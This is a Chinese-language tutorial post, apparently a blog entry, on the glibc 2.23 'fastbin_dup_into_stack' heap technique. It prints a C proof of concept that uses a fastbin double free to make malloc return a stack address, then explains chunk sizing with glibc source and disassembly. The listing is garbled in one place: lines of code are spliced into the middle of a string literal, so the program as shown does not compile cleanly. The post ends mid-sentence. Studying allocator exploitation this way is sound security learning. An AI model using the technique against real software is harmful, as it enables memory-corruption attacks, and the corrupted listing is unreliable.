环境：Linux x64 -- glibc 2.23

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8)	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
: %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

编译参数：

```bash
gcc -g -Wl,--rpath=/path/to/libc/lib -Wl,--dynamic-linker=/path/to/libc/ld.soc fastbin_dup_into_stack.c -o fastbin_dup_into_stack
```

编译后 ldd 可以看出来

```
$ ldd fastbin_dup_into_stack 
	linux-vdso.so.1 (0x00007ffe2c1f7000)
	libdl.so.2 => /glibc/x64/2.23/lib/libdl.so.2 (0x00007feaacc0c000)
	libc.so.6 => /glibc/x64/2.23/lib/libc.so.6 (0x00007feaac86b000)
	/glibc/x64/2.23/lib/ld-2.23.so => /usr/lib64/ld-linux-x86-64.so.2 (0x00007feaace17000)
```

我的 libc 是放在 /glibc 的，所以编译出来的 elf 共享库链接都会指向我给定的编译参数（-Wl,--rpath= 和 -Wl,--dynamic-linker=）



可以看到  `stack_var` 变量是放在栈上的，我们要经过一系列操作让 `malloc` 分配到这一个变量的地址

```c
int *a = malloc(8);
int *b = malloc(8);
int *c = malloc(8);
```
在堆上分配了三个 chunk，看起来我们分配的是大小为 8 的的内存，其实 malloc 会给我们分配 16 字节的空间，还有 chunk 的 prev_size 和 size 字段要占用 16 字节，所以 ptmalloc 会给我们分配的 chunk 大小为 32 字节（最小 chunk）

可以结合源码调试看看

![](https://gitee.com/scriptkiddies/images/raw/master/20201110221502.png)

我的 libc 是带有 debug info 的，所以我直接在 `__libc_malloc` 下断点（这个是 glibc 的 malloc 的入口）

![](https://gitee.com/scriptkiddies/images/raw/master/20201110221825.png)

```c
__GI___libc_malloc (bytes=8)
```

我们请求分配的是 8 字节的内存，这个函数只是会进行一些简单的检查，然后把 分配区 和分配的大小 传给 `_int_malloc` ， malloc 的主要逻辑都是在 `_int_malloc` 里面

在 `_int_malloc` 中会进行

```
checked_request2size (bytes, nb);
```

计算出对应的 chunk 的大小

这个宏的定义

```c
#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                             \
  if (REQUEST_OUT_OF_RANGE (req)) {					      \
      __set_errno (ENOMEM);						      \
      return 0;								      \
    }									      \
  (sz) = request2size (req);
```

所以我们分配 8 字节的内存得到的 chunk 的大小为 MINSIZE 在 x64 下是 32

我挑出了相关操作的汇编

```asm
│   0x7ffff78ab7ba <_int_malloc+10>         mov    rax,rsi                                     
......                                   
│   0x7ffff78ab7c1 <_int_malloc+17>         add    rax,0x17
......
│   0x7ffff78ab7ca <_int_malloc+26>         push   rbx
│   0x7ffff78ab7cb <_int_malloc+27>         mov    r9,rax
│   0x7ffff78ab7ce <_int_malloc+30>         and    r9,0xfffffffffffffff0
......
│   0x7ffff78ab7d9 <_int_malloc+41>         cmp    rax,0x20
│   0x7ffff78ab7dd <_int_malloc+45>         mov    eax,0x20 
│   0x7ffff78ab7e2 <_int_malloc+50>         cmovae rax,r9 
```

可以看到的是，会先把我们请求的内存大小加上 0x17，然后屏蔽掉第